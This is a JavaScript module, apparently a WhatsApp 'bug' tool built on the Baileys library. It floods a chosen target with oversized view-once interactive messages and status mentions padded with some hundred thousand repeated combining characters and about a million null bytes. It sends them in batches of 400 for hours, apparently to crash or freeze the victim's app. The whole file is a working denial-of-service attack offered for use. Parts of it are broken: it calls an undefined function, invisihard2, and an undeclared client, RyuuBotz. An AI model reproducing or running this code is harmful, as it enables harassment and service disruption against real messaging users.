//API BUG 
const chalk = require("chalk");
const crypto = require("crypto");
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");

async function ApiBug(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
       }

        try {
    if (count < 400) {
        await Promise.all([
            invisihard2(target, false),
          ]);
        console.log(chalk.blue(`API BUG (DELAY)${count}/400 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
    } else {
        console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 400 Messages"));
        setTimeout(sendNext, 100);
    }
} catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 100);
}
};

sendNext();

}

//FUNC NYA LEK
async function invisihard(target, mention) {
  console.log(chalk.red("Invisi hard sended"));
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "C U K I M A Y" + "ោ៝".repeat(99999),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "FUCK YOU" + "ោ៝".repeat(100000),
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "CrashNewsletter (💀)",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await RyuuBotz.sendMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await RyuuBotz.sendMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "\u0000".repeat(10000) },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}
module.exports = invisihard;
